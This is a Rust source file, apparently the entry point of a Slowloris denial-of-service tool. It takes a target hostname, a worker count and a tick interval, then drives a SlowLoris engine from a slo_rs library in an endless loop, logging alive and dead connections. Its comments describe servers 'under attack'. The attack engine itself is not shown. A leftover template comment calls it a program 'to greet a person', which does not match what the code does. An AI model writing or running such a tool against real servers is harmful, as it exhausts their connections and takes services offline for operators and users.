#![feature(thread_sleep_until)]

use log::info;
use slo_rs::slowloris::SlowLoris;
use std::{
    thread,
    time::{Duration, Instant},
};

use clap::Parser;

/// Simple program to greet a person
#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
struct Args {
    /// Hostname to run against
    #[arg(long)]
    hostname: String,

    /// Number of worker Loris to run
    #[arg(long)]
    num_loris: usize,

    /// Time interval between Loris ticks. Different servers behave
    /// differently when under attack. In general this is the
    /// time between pulses of activity from each Loris.
    #[arg(long, default_value_t = 500)]
    interval_ms: u64,
}

fn main() {
    colog::default_builder().init();

    let args = Args::parse();
    let mut slow_loris = SlowLoris::new(
        args.hostname,
        Duration::from_millis(args.interval_ms),
        args.num_loris,
    );

    loop {
        let next_tick_at = slow_loris.tick();
        let time_until_next_tick = next_tick_at - Instant::now();

        info!(
            "{} alive and {} dead, ticking again in {time_until_next_tick:?}",
            slow_loris.get_alive(),
            slow_loris.get_dead()
        );

        thread::sleep_until(next_tick_at);
    }
}
